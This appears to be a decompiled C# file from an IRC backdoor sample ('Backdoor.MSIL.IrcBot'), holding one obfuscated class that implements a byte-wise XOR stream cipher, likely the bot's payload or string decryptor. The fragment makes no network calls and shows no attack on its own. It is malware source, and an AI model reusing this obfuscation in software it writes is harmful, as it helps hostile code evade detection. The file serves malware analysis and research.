// Decompiled with JetBrains decompiler
// Type: 
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using System;
using System.Security.Cryptography;

internal class \uE009 : \uE007, ICryptoTransform, IDisposable
{
  internal \uE009(byte[] _param1) => this.\uE000(_param1);

  public byte[] TransformFinalBlock(byte[] inputBuffer, int inputOffset, int inputCount)
  {
    byte[] outputBuffer = new byte[inputCount];
    this.TransformBlock(inputBuffer, inputOffset, inputCount, outputBuffer, 0);
    return outputBuffer;
  }

  public int TransformBlock(
    byte[] inputBuffer,
    int inputOffset,
    int inputCount,
    byte[] outputBuffer,
    int outputOffset)
  {
    for (int index = inputOffset; index < inputOffset + inputCount; ++index)
    {
      byte num = (byte) ((int) inputBuffer[index] ^ (int) this.\uE000());
      outputBuffer[outputOffset++] = num;
      this.\uE000(num);
    }
    return inputCount;
  }

  public bool CanReuseTransform => true;

  public int InputBlockSize => 1;

  public int OutputBlockSize => 1;

  public bool CanTransformMultipleBlocks => true;

  public void Dispose() => this.\uE000();
}
